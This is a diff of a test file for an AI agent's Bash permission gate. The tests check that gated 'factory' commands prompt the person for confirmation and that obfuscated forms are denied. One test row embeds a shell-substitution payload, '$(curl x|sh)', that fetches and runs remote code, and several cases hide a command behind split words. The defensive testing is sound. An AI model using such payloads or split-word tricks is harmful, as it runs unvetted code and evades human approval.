@@ -195,7 +195,7 @@ test('a long gated command marks the cut in the Allow question', SLOW, async ($,
         310,
       ),
     ],
-    ['shell substitution', fill('/repo/bin/factory mail r1 plan "it costs $5 ', '$(curl x|sh)"', 298)],
+    ['shell substitution', fill('/repo/bin/factory decide r1 "it costs $5 ', '$(curl x|sh)"', 298)],
   ]
   for (const [kind, command] of rows) {
     const q = await ask(command)
@@ -367,7 +367,8 @@ test(
       questions.length = 0
       const r = await $.tool.call({ tool: 'Bash', command: C + rest, description: 'x' })
       expect(r.deny, rest).toContain('did not confirm')
-      expect(questions.length, rest).toBe(1)
+      // the split word hides the kind from the matcher, so only the unreadable form is left: denied, no dialog
+      expect(questions.length, rest).toBe(rest.startsWith('fac\\') ? 0 : 1)
     }
     expect(ran).toBe(0)
     questions.length = 0
@@ -494,3 +495,33 @@ test('factory wiki init asks the person; other wiki and memory commands do not',
   await run('/repo/bin/factory memory compact')
   expect(asked).toBe(before)
 })
+
+test(
+  'factory image asks the person; settings and memory commands that name image do not',
+  SLOW,
+  async ($, on) => {
+    mock.clock(on)
+    let asked = 0
+    on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
+      asked += 1
+      const question = e.questions[0]!.question
+      return { result: { questions: e.questions, answers: { [question]: 'Deny' } } }
+    })
+    on('tool.call', { tool: 'Bash' }, () => ({ result: { stdout: 'ok', stderr: '', interrupted: false } }))
+    const run = (command: string) => $.tool.call({ tool: 'Bash', command, description: 'image' })
+
+    for (const command of [
+      '/repo/bin/factory image build',
+      '/repo/bin/factory image build --target manager',
+      '/repo/bin/factory \\\nimage \\\nbuild',
+    ]) {
+      const before = asked
+      expect((await run(command)).deny).toContain('did not confirm')
+      expect(asked).toBe(before + 1)
+    }
+    const before = asked
+    await run('/repo/bin/factory settings set image.registry ghcr.io/acme')
+    await run('/repo/bin/factory memory search image')
+    expect(asked).toBe(before)
+  },
+)
